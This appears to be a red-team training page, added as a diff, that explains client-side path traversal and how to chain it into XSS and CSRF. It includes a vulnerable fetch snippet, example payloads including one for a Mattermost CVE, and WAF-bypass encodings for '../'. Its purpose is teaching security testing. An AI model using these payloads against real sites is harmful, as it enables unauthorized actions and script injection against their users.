@@ -1,0 +1,110 @@
+---
+layout: training-page
+title: "Client Side Path Traversal — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - cspt
+  - csrf
+  - xss
+  - path-traversal
+  - web
+page_key: "web-client-side-path-traversal"
+---
+<h1>Client Side Path Traversal</h1>
+<p>Client-Side Path Traversal (CSPT), also called "On-site Request Forgery," is a vulnerability where an application's front-end JavaScript constructs a <code>fetch</code> or XHR URL using user-controlled input without proper path encoding. By injecting <code>../</code> sequences, an attacker redirects the request to an arbitrary endpoint on the same origin. Because the request originates from the victim's browser, it automatically carries the victim's cookies and authentication headers — bypassing same-site cookie restrictions and anti-CSRF token validation.</p>
+
+<h2>How CSPT Works</h2>
+<p>A page takes a user-controlled value (from a query parameter, hash, or path segment) and places it directly into a <code>fetch</code> call:</p>
+<pre><code>// Vulnerable code on the page
+const newsId = new URLSearchParams(window.location.search).get('newsitemid');
+fetch('/newitems/' + newsId);  // newsitemid is not sanitized</code></pre>
+<p>By injecting <code>../</code> sequences into <code>newsitemid</code>, the browser normalizes the path and sends the request to a different endpoint:</p>
+<pre><code># Original request
+GET /newitems/123
+
+# With path traversal injection
+GET /newitems/../pricing/default.js?cb=alert(1)
+# Normalized by browser to:
+GET /pricing/default.js?cb=alert(1)</code></pre>
+
+<h2>CSPT to XSS</h2>
+<p>CSPT becomes XSS when the response from the traversed endpoint is reflected into the DOM without sanitization. The attacker chains a CSPT source (the traversable parameter) with an XSS sink (an endpoint that reflects its input).</p>
+<p><strong>Real example:</strong></p>
+<pre><code># Source page fetches content based on newsitemid parameter
+https://example.com/static/cms/news.html?newsitemid=&lt;id&gt;
+
+# Sink: text injection at /pricing/default.js via cb parameter
+https://example.com/pricing/default.js?cb=alert(document.domain)//
+
+# CSPT payload combining both — inject ../pricing/default.js path and XSS payload
+https://example.com/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//</code></pre>
+
+<h2>CSPT to CSRF (CSPT2CSRF)</h2>
+<p>CSPT can bypass CSRF defenses because the fetch is initiated by the legitimate application front-end. The browser attaches CSRF tokens and SameSite cookies automatically. This enables CSRF-equivalent impact against endpoints that would normally be protected.</p>
+<table>
+  <thead>
+    <tr><th>Capability</th><th>Classic CSRF</th><th>CSPT2CSRF</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>POST CSRF</td><td>Yes</td><td>Yes</td></tr>
+    <tr><td>Control the request body</td><td>Yes</td><td>No</td></tr>
+    <tr><td>Works with anti-CSRF token</td><td>No</td><td>Yes</td></tr>
+    <tr><td>Works with SameSite=Lax</td><td>No</td><td>Yes</td></tr>
+    <tr><td>GET / PATCH / PUT / DELETE</td><td>No</td><td>Yes</td></tr>
+    <tr><td>1-click attack</td><td>No</td><td>Yes</td></tr>
+  </tbody>
+</table>
+
+<h3>Real-World CSPT2CSRF Examples</h3>
+<pre><code># CVE-2023-45316 — Mattermost POST sink
+/&lt;team&gt;/channels/channelname?telem_action=under_control&forceRHSOpen\
+&telem_run_id=../../../../../../api/v4/caches/invalidate
+
+# CSPT to cancel a resource (GET sink)
+https://example.com/signup/invite?email=foo%40bar.com\
+&inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=</code></pre>
+
+<h2>Discovery Methodology</h2>
+<p>CSPT sources are parameters that end up in a URL path component of a client-side HTTP request. Look for:</p>
+<ul>
+  <li>Query parameters that get placed in fetch/XHR URLs: <code>id=</code>, <code>page=</code>, <code>path=</code>, <code>resource=</code></li>
+  <li>Hash fragments used to build API calls</li>
+  <li>Path segments extracted with <code>location.pathname</code> and passed to fetch</li>
+</ul>
+<p>CSPT sinks are endpoints that produce exploitable responses when traversed to:</p>
+<ul>
+  <li>Endpoints that reflect input into the response (XSS sinks)</li>
+  <li>State-changing API endpoints that accept GET, POST, PATCH, DELETE (CSRF sinks)</li>
+</ul>
+
+<h3>Burp Extension — Automated Discovery</h3>
+<pre><code># Install the CSPTBurpExtension from the BApp Store
+# It passively monitors traffic and flags parameters injected into fetch URLs
+# Also supports active scanning with ../  payloads</code></pre>
+
+<h3>WAF Bypass via Encoding</h3>
+<p>WAFs that filter raw <code>../</code> may miss encoded variants:</p>
+<pre><code># Double URL encode
+..%2F
+%2E%2E%2F
+%2E%2E/
+..%252F  (double encoded %25 = %)
+
+# Bypass with extra slashes
+....//  (resolved to ../ by some normalizers)</code></pre>
+
+<h2>Tools</h2>
+<ul>
+  <li><a href="https://github.com/doyensec/CSPTBurpExtension">doyensec/CSPTBurpExtension</a> — Burp Suite extension to find and exploit CSPT</li>
+  <li><a href="https://github.com/doyensec/CSPTPlayground">doyensec/CSPTPlayground</a> — Open-source lab environment for CSPT practice</li>
+</ul>
+
+<h2>Resources</h2>
+<ul>
+  <li>Exploiting CSPT to Perform CSRF — Introducing CSPT2CSRF — Maxence Schmitt — <code>blog.doyensec.com/2024/07/02/cspt2csrf.html</code></li>
+  <li>CSPT2CSRF Whitepaper — Maxence Schmitt — <code>doyensec.com/resources/Doyensec_CSPT2CSRF_Whitepaper.pdf</code></li>
+  <li>On-Site Request Forgery — Dafydd Stuttard — <code>portswigger.net/blog/on-site-request-forgery</code></li>
+  <li>Bypassing WAFs to Exploit CSPT Using Encoding Levels — Matan Berson — <code>matanber.com/blog/cspt-levels</code></li>
+  <li>Leaking Jupyter Auth Token via CSPT Chaining — Davwwwx — <code>blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/</code></li>
+  <li>Bypassing File Upload Restrictions to Exploit CSPT — Maxence Schmitt — <code>blog.doyensec.com/2025/01/09/cspt-file-upload.html</code></li>
+</ul>
